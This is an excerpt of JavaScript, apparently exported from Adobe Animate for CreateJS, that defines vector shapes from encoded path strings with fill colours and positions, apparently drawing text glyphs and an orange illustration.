	this.shape_9.graphics.f("#FFFEFD").s().p("ABRDdIgCgSIgEgQQAYAFAMgFQANgHAGgVQAEgNADggIADgyIgdAAQgJAxgcArQgaAnglAaIgLgMIgJgLQAlgVAbgmQAYgjALgoIgiAAQgMAigaAhQgZAigeAQIgQgXQAYgJAYgbQAYgbAMgfIgfAAIgVAbQgOAQgNAKIgSgUQAUgNAVgaQAXgcAIgcIgsAAIAAgZIDRAAIAAAZIiLAAQgEAKgEAHIgJATICUAAQgBBYgJAnQgIAjgPAMQgKAIgNABIgEAAIgWAAgAiSDMIgEgSIASADQANABAEgFQAFgGAAgSIAAiCIgpAaQAAAKgDACQgDAAgEgKIgJgaIAdgPIAfgSIAAhmIg3AAIAAgaIA3AAIAAhcIAXAFQAKACgCAEQAAACgIAEIAABLIArAAIAAAaIgrAAIAABdIAogaIAAAeIgoAWIAAChQAAAXgHAIQgIAKgYACIgTAAgAgJg2IAAibICTAAIAACbgAAMhPIBoAAIAAgqIhoAAgAAMiQIBoAAIAAgoIhoAAg");
	this.shape_9.setTransform(223.8,395.1);

	this.shape_10 = new cjs.Shape();
	this.shape_10.graphics.f("#FFFEFD").s().p("AA9CnQgqglgTgsQgQAwglAiQgnAkg+ASIgRgcQBAgPAogiQAkgfAOgxIiVAAIAAgbIBAAAIAAhtIBeAAIgBg0IAVADQALACAAAEQAAACgHADIgCACIgBAkIBkAAIAABtIA1AAIAAAbIiWAAQASAuArAjQAqAhA1APQgEAFgDAJIgIAQQg2gVgqgkgAAMAmIBNAAIAAhTIhMAAgAhQAmIBFAAIAChTIhHAAgAAxhkIAAgwIhaAAIAAAvIgYAAIAAgvIhhAAIAAgaIBhAAIAAgxIAWADQAJACgCAEQABACgGAEIAAABIAAAhIBaAAIAAgwIAUADQAJABAAADQgBAEgGAEIAAAhIBcAAIAAAaIhcAAIAAAwg");
	this.shape_10.setTransform(177,395);

	this.shape_11 = new cjs.Shape();
	this.shape_11.graphics.f("#FFFEFD").s().p("AA5BfIAMABQAFgBACgDQACgEABgHIABgUIhMAAIAAAuIgLAAIAAguIgYAAIAAgKIAYAAIAAg1IApAAIAAgRIg+AAIAAgLIAjAAIAAgSIgSAAIAAgKIASAAIAAgRIgbAAIAAgLIAbAAIAAgUIAMABQAFABABABQAAAAgBABQAAAAAAAAQgBABAAAAQgBABgBAAIAAAOIAlAAIAAgWIALABQAFABABACQAAAAAAABQAAAAAAAAQgBABAAAAQgBABgBAAIAAAPIAfAAIAAALIgfAAIAAARIAXAAIAAAKIgXAAIAAASIAnAAIAAALIhAAAIAAARIAtAAIAAA1IAYAAIAAAKIgYAAQAAAVgBAGQAAAJgDAFQgDAFgGABIgQABgAAvAzIAhAAIAAgRIghAAgAAEAzIAeAAIAAgRIgeAAgAAvAWIAhAAIAAgOIghAAgAAEAWIAeAAIAAgOIgeAAgAAVgeIAlAAIAAgSIglAAgAAVg6IAlAAIAAgRIglAAgAhHBpIAAhrQgEAIgLAQIgRAWIgMgJQARgSAJgOQALgQAHgXIAAgKIgjAAIAAgMIAjAAIAAgsIAMAAQAHABAAACQAAACgEACIAAAlIAcAAIAAAMIgcAAIAAAGQAEAOAJAOQAKAPAKAJIgMAKIgKgPQgHgHgEgLIAAB0g");
	this.shape_11.setTransform(453.3,446);

	this.shape_12 = new cjs.Shape();
	this.shape_12.graphics.f("#FFFEFD").s().p("AhMBvIAAh0QgFANgIAPQgJAOgHAIIgLgKQAKgMAMgVQAIgMAKgYIAAgJIgeAAIAAgNIAeAAIAAgzIANAAQAHABAAABQgBACgEADIAAAsIAVAAIAAANIgVAAIAAAGIAMAUQAFAIAGAIIgIAJQgDgCgFgGQgEgEgDgFIAAB4gABbBrQgPgDgXghQgMAKgNAIQgMAHgQAJIgMgMQAQgHARgIQANgIAMgLQgGgMgDgIQgDgLgDgNIghAAIAAAHIgBAIIAAACIAYAWIgIAKIgTgSQgDAOgIAQQgLARgJAJIgOgIQAQgNAKgVQALgXgBgWIgWAAIAAgNIBCAAQgEgRgDgeQgCgcgBglIAMABQAGABABACQAAACgFAEQAAAWADAeQADAcAFAWIAoAAIgagRIAGgJIgPABQgCAGgCAAQgCAAgCgGIgDgKIAKgBIAOgTIgbgRIAGgLIAIAEIARgdIAKAIQAEACgBACQgBABgEAAIgPAXIAFADIAGAEIAPgZIAJAJQAFAEAAADQgBABgGgBIgbAkIAXgDIgDgEIgDgGIAKgGIAAAAIATAeIgKAIIgCgFIgGgGIgaAEIAbATIgGAHIAVAAIAAANIg/AAQABAIADAKIAGAPIALgMQAGgJADgHIAJAHQAFAFAAACQAAAAgBAAQAAABgBAAQAAAAgBAAQgBABgBAAIgXAbQAIALAJAIQAHAIAEAAQAEAAAEgFIAGgSIANANQgKAbgOAAIgCAAgAgngNIgCgLIAOgBIAMgTIgagTIAIgJIACACIACABIAWgkIAIAIQAGADgBACIgGACIgRAcIAKAIIALgVIAJAHQAFAFgBABQgBABgFABIgYAiIAPgCIgCgHIAJgHIAJAOIAGAOIgKAHIgDgGIgDgFIgnAFQgCAGgCABQgCAAgCgHg");
	this.shape_12.setTransform(426.6,445.5);

	this.shape_13 = new cjs.Shape();
	this.shape_13.graphics.f("#FFFEFD").s().p("AgOBpIgHgGQAVgIAOgRQAPgQAFgWIgyAAIAAgNIA1AAIABgYIANABQAGABAAACQAAACgEAAIgDASIAwAAQgBArgFASQgEAPgLAFQgGADgJABIgOAAIgBgJIgDgHQAMADAKgCQAJgDADgIQADgGABgOQACgSgBgIIgjAAQgGAZgPAUQgOATgWALIgFgGgAhKBfQANACAFgDQAGgDAAgHIAAhMQgKARgNASQgJANgNAPIgLgIIgBAAQAPgMAPgXQASgZAJgWIgtAAIAAgMIBdAAIAEAHIgXAiIgKgHIAPgWIgUAAIAABoQAAAOgGAFQgGAGgVAAgAgDgFQAJgCAMgHQALgFAKgKQgHgEgJgLQgIgLgEgKIgIAMQgDAGgEAEIgNgIQAKgHALgSQALgRAFgRIALAEQAGACAAABQAAAAAAABQAAAAAAAAQgBAAAAABQgBAAgBAAIgDACIgDAHIgEAFIBKAAIAAALIgVAAQgDANgFAMQgGAOgGAGQAJAHAMADIAeAJIgKAMIgbgJQgLgFgKgHQgKAKgMAHQgMAGgMABgAAgg2QAIALAIAFQAEgGAFgKQAFgMACgKIgrAAQADALAIALgAhFhBIAKgIIANAOIAWgcIg7AAIAAgMIBLAAIAEAIIgfAlIgCAEIAIAJIgKAJg");
	this.shape_13.setTransform(399.8,445.8);

	this.shape_14 = new cjs.Shape();
	this.shape_14.graphics.f("#FFFEFD").s().p("AggBnIgDgKIAMABQAKAAADgBQADgCAAgGIAAgWIhHAAIAAgNIBHAAIAAgPIhgAAIAAgMIBgAAIAAgQIhFAAIAAgJIBFAAIAAgPIg/AAIAAgoIA/AAIAAgQIhcAAIAAgNIBcAAIAAgYIAMABQAHABAAACQgCACgEABIAAARIBXAAIAAANIhXAAIAAAQIBBAAIAAAoIhBAAIAAAPIBDAAIAAAZIAfAAIAAAMIgfAAIAAAkIgPAAIAAgIIg0AAIAAAZQAAAMgFAFQgDADgOACIgPABQABgCgCgGgAAGAyIA0AAIAAgPIg0AAgAAGAXIA0AAIAAgQIg0AAgAAGgcIAyAAIAAgTIgyAAgAg4gcIAxAAIAAgTIgxAAg");
	this.shape_14.setTransform(373.4,445.9);

	this.shape_15 = new cjs.Shape();
	this.shape_15.graphics.f("#FFFEFD").s().p("AAwBzIAAg+Ig8AAIAAgNIA8AAIAAghIAMABQAIAAgBADQAAACgFADIAAAYIA1AAIAAANIg1AAIAAA+gAguBuIAAhZIgcAAQgDAVgGAXQgIAZgKAQIgNgHQASgbAIgtQAEgbAAglIgDhIIALABQAJACAAACQAAABgEADIAAA4IAXAAIAAhBIAMABQAHABgBACIgEAEIAAA5IATAAIAAANIg4AAIgCAnIApAAIAABmgAgCAZQAMgHAGgFQAJgGAEgHIgkAAIAAhWIAmAAIAGgMIAFgQIALAFQAHADgCABQgCACgEAAIgDAJIgFAIIA4AAIAABWIg4AAQgEALgJAJQgIAJgMAFgAAwgJIAmAAIAAgaIgjAAgAAFgJIAdAAIACgMQACgHAAgHIghAAgAAzgwIAjAAIAAgZIgjAAgAAFgwIAhAAIAAgZIghAAg");
	this.shape_15.setTransform(346.8,445.6);

	this.shape_16 = new cjs.Shape();
	this.shape_16.graphics.f("#FFFEFD").s().p("AAMBmIAAhgIBUAAIAABfIgPAAIAAgSIg2AAIAAATgAAbBGIA2AAIAAgzIg2AAgAhfBmIAAhfIBTAAIAABdIgOAAIAAgSIg2AAIAAAUgAhQBFIA2AAIAAgxIg2AAgAAogOIAAgMIhRAAIAAAMIgPAAIAAhXIBvAAIAABXgAgpgnIBRAAIAAgxIhRAAg");
	this.shape_16.setTransform(319.8,445.5);

	this.shape_17 = new cjs.Shape();
	this.shape_17.graphics.f("#FFFEFD").s().p("AhCBuIAAhZIB+AAIAABYIgQAAIAAgPIhfAAIAAAQgAgzBRIBfAAIAAguIhfAAgAhxgPQAZgJAcgYQAggcATghIAOAFQAGACAAACQAAAAAAAAQgBAAAAABQAAAAgBAAQgBABAAAAIgDADQARAXAiAWQAfAWAbAGIgPAQQgkgSgWgRQgRgMgcgiQgWAcgVAUQgZAXgcAQgAg7gGIAAgNIB0AAIAAANg");
	this.shape_17.setTransform(293.4,445.5);

	this.shape_18 = new cjs.Shape();
	this.shape_18.graphics.f("#FFFEFD").s().p("ABGBnQgNgIgLgJQgPAKgTAIQgVAJgPACIgJgOQAPgBARgGQAXgJANgJIgagdQgNANgJAEQgLAJgMAEIgLgLQAUgHATgPQASgQAJgTIgVAAIAAhBIBbAAIAABBIg0AAIgNATIA7AAIAIAIIgSAZQgIAKgJAHQAKAIAOAFQARAHASABIgHAIIgHAJQgQgFgPgIgAAfA4IAOAMQAGgEAHgIIALgPIgxAAQAEAGAHAJgAAKgBIBAAAIAAgPIhAAAgAAKgcIBAAAIAAgPIhAAAgAhOB0IAAh0IgaAXIgKgLQAQgKATgUQAUgWAIgRIg4AAIAAgMIAfAAIAAgsIAMACQAHABAAACQAAABgFADIAAAjIAZAAIAGAHIghAvIAAAJQAEAGAMAIQAKAIAKAGIgKAMIgOgNIgMgMIAABrgAgsgNIAQgZIAJAFQAGADAAACQgBABgEABIgRAVgAgchCQALgIAJgOQAIgNADgNIALAGQAHACgBADQgBACgEAAIgEAFIgFAJIBkAAIAAANIhrAAIgPASg");
	this.shape_18.setTransform(266.3,445.9);

	this.shape_19 = new cjs.Shape();
	this.shape_19.graphics.f("#FFFEFD").s().p("AgxC4QADgvAugDQAsADAFAvQgFAtgsADQgvgDgCgtgAgkBFIgFj9QAAgsArgDQArADACAsIgFD7QgIAmgiACQgkAAAAgmg");
	this.shape_19.setTransform(556.3,508.2);

	this.shape_20 = new cjs.Shape();
	this.shape_20.graphics.f("#FFFEFD").s().p("AhCERQgtgSAIgiQAMgcAtAPQAmAMAAgWIAAiqIivAAQhLAHAMhBIAKjIQAAgoA6AAQDYADCigQQAqgCAFAgQAAAkgoAEQhuAIhXACQhbADhBgDQgcAAAGASIgFCHQAAAPAMgDICZAAIAAhhQAAgcAhAAQAiADADAbIAABfIC+AAQAcADACAgQAAAfgbAAIjBAAIAADNQgIAzg4AAQgaAAgmgLgAkWD2QgZgZAZgXQA+g3ArhLQARgeAhARQAeAUgPAeQhCBngxAmQgPAJgOAAQgOAAgMgJgADhDsIgNgPIhLhqQgcgjAcgWQAfgUAdAeQAxBCAnBAQARAcgbAUQgLAGgKAAQgPAAgOgQg");
	this.shape_20.setTransform(508,508.6);

	this.shape_21 = new cjs.Shape();
	this.shape_21.graphics.f("#FFFEFD").s().p("Ah7EUQgVgeAfgUQBng/AZhzIhxAAQgZAAgDgmQACgjAagDIB4AAIAAhQQAAgNADgRIg/AAQgeAAAAglQAAglAegDIA8AAIAAgwQAAgZAmgCQAlACADAZIAAAwIBhAAQAzADAEAvIAACJIAXAAQAUADACAjQAAAmgUAAIidAAQAwBkBrBJIAKAFQAUARgUAeQgUAZgcgMQhjg8hChnQgxBshWA0QgPAIgNAAQgSAAgOgPgABkgcIBLAAIAAhmQgCgFgGgDIhBAAgAjYEMIAAoTQAAgUAjgCQAkACACAUIAAITQgCAXgkAAQgjAAAAgXgAkogDQAFgxADguQACgkADgdQAZgjAeAmQAABvgNA0QgJAWgaAAQgWgEACgYgAhxhBQgCgFgVhdQAKgoAoAhQANAsAKAzQAAAWgXAIIgFAAQgUAAgCgUg");
	this.shape_21.setTransform(444.2,507.8);

	this.shape_22 = new cjs.Shape();
	this.shape_22.graphics.f("#FFFEFD").s().p("Ai7EPIAAi0QgSAqgWAeQgUAcgegPQgegUASgeIAHgNQBBheAchRIhLAAQgUAAAAgjQACggAUgDIBLAAIAAhJQgVAFgkAAQgaADgEgeQgGgjAagFQBggKBWgUQAbgFALAbQAHAhgZAKQgrANgWACIAABVIA3AAIAPAFQgCgGgKgnQgDgZAcgIQAbgCALAWQASAzAOA2QAIAkAHAtQAAAZgbAHQgfADgFgZIgKgkIgMg3QgGAVgOgDIg3AAQAhA9AnAxIASAXQAMAegWAUQgcAPgUgZQgRgVgXgsIAADhQgDAZggADQgjgDAAgZgAgxEeQgagWAQgcQACgFAPgMQB7h5AAilIgCiqIAAgXQACgbAmgDQAiADADAbQAAAJgCAQIAACvQAAB3B4CMIAUAZQAKAbgZASQgcARgWgUQg0hBg1hpQgpBuhSBOQgLAKgOAAQgNAAgMgIgADHAVQgcgKAFgaQADgPAUhLQAShCACgLQAHgWAhAEQAeAGAAAYQgfB6gTAxQgKAVgTAAIgLgBg");
	this.shape_22.setTransform(379.8,508.3);

	this.shape_23 = new cjs.Shape();
	this.shape_23.graphics.f("#FFFEFD").s().p("AglEGIAAiKIiyAAQg5AFAChDIAAjJQgFg5A6ACIC0AAIAAhDQAAgcAjgCQAkAAACAbIAABGIC5AAQA1AAgDA1IAADQQADA/g4gGIi2AAIAACKQgCAbgiADQglgDAAgbgAAkA0ICRAAQAPADAAgQIAAiPQAAgRgPAAIiRAAgAjDhoIAACNQgCASAUgDICMAAIAAitIiMAAQgUAAACARg");
	this.shape_23.setTransform(316.3,507.9);

	this.shape_24 = new cjs.Shape();
	this.shape_24.graphics.f("#FFFEFD").s().p("AjeEPIAAjNQghAjgbgPQgZgXAcgjQBLhNAlhOQACgHgCgDQgDgFgHAAIhQAAQgZAAAAghQAAggAZgDIA1AAQgVgMgMgUQgSgZAXgUQAWgUAaARQAVAQAOATQARAhgWAMIAqAAQArADgPAyQghBQggA0QAIAIAMAHQAmAUAMAIQAbAagPAbQgSAZgggUQgIgEgOgJQgQgKgCgFIAADfQgDAZgdADQghgDAAgZgAh8EZQgSgbAcgZQByhMABieIgPAAQgtADAAg1IAAigQgDg5A1AAIDaAAQA5gCgCA5IAAClQAAAygwgDIgqAAIAADRQAAAOAMgCIAUAAQAZAMgChuQAAgbAggDQAfADACAbQAHC3hVgUIgvAAQhEAAADg5IAAjlIghAAQgKDiiFA/QgQAIgMAAQgPAAgJgLgAAJi2IAABaQgDAUAXgDICRAAQARADAAgXIAAhXQAAgSgRAAIiRAAQgXAAADASg");
	this.shape_24.setTransform(252,508.3);

	this.shape_25 = new cjs.Shape();
	this.shape_25.graphics.f("#FFFEFD").s().p("AhREjQgyAAgWgPQgcgwA6gKQA1AKgGgRIAAi6QAAgbAjgDQAkADACAbIAADJQADBBhLAAIgGAAgAA+EFIgUg/QgPg5gHgkQgIgiAhgLQAhgHAMAjQAiB7AIAoQADAbghAIIgFAAQgcAAgHgZgAkCEFQgXgXAUgRQA4g/AnhVQgVAXguAbQghAUgUgZQgRghAegUQBfg0Alg4Ih1AAQgaAAgCggQACggAagDIB9AAIAAg1IhpAAQgcAAgCgjQACggAcgDIBpAAIAAgeQAAgWAjgDQAjADACAWIAAAeICFAAIAAggQAAgXAjgCQAjACADAXIAAAgIBmAAQAcADACAgQgCAjgcAAIhmAAIAAA3IB1AAQAaADACAgQgFAhgZAAIhuAAQAqA8BQAmQAeASgMAgQgPAbghgMIgWgKIgIgIQAaA7AgAxQAMAZgZASQggAPgPgXQgRgWgcgzQgZgqgPgeQgUgmAjgPQgsgngdgzIiCAAQggA8g1AoQA3AGgPAvQgoBag8A6QgMAKgMAAQgNAAgNgKgAg9hsICFAAIAAg3IiFAAg");
	this.shape_25.setTransform(188.1,507.8);

	this.shape_26 = new cjs.Shape();
	this.shape_26.graphics.f("#FFA300").s().p("AChRsQh9h2hYkvQhSkUANikQAHhdgJhZIgKhGQjehYg9jbQgThFAAhJIADg7QgpAAg+BjIg2BkQhHCHh4AxQgmAPgmAFIgeABQhrgRgmhTQgMgagEgdIgBgYQAWAfA3ASQAbAJAWACQBcAhBfhNQAwgnAdguQAyhbBQhhQAngxAegfQgEgWgngMIglgIQhGiuABiwQAAg4AHgwIAIgmQBqAjBbCLQAtBFAYA/QBVCkBjAnQAxAUAhgNIACgYQgjg7AAhdIAGhRQhthggBhPQAAgZAKgUIALgPQA7ghA3BMQAcAmAQAsQAJApAQAHQAJAEAHgFIAAgYQAch/A5gdQAdgOAXALQAiAmgOBKQgGAlgOAeQgRATgDAYQgCAMABAIQAxCDg/BXQgUAcgdATIgYAOQgOAeAUAhQARAbAYAIQBBAYBCBZQAhAtATAnQAngFAOAYQAGAMgBAOQAlBLCSBbQBJAtBCAeQgZAMgwgHIgrgJQADBUgTBbQgKAtgKAcQgTgvg7gyIg2gpQAcDDFFEoQCiCUCdBtQkRDglPA7QhpAThiAAgAFYE1QgGgsgYheIgYhVIhHAfQAFBDA8BFQAfAjAdAVIAAAAgACwgIQAeAZAjgDIAAhKQgiAIgmhOIgfhQQgWCVA8A1gAhqg8QgWj6gFhMQgngUgrgcQhWg2gTglQgOgOgNAOQgYAbAKCKIAIAjQAMArAWAoQBHCACOA2IAAAAgAiQwWIgFAIQgEAKAEAPQALAuBUBFIALAFQAMABABgUQgPgngWglQgkg8gdAAQgGAAgGACgABev/QgeASgLBFIAMABQAPADASAHQAOgTAKgWQAUgsgTgSQgFgBgEAAQgJAAgLAGg");
	this.shape_26.setTransform(338.8,234.5,0.932,0.932);

	this.instance = new lib.Path_1();
	this.instance.setTransform(360.3,220.3,0.932,0.932,0,0,0,161.7,160.2);
	this.instance.shadow = new cjs.Shadow("rgba(255,188,39,0.208)",0,0,18);

	this.shape_27 = new cjs.Shape();
	this.shape_27.graphics.f("#FFFEFD").s().p("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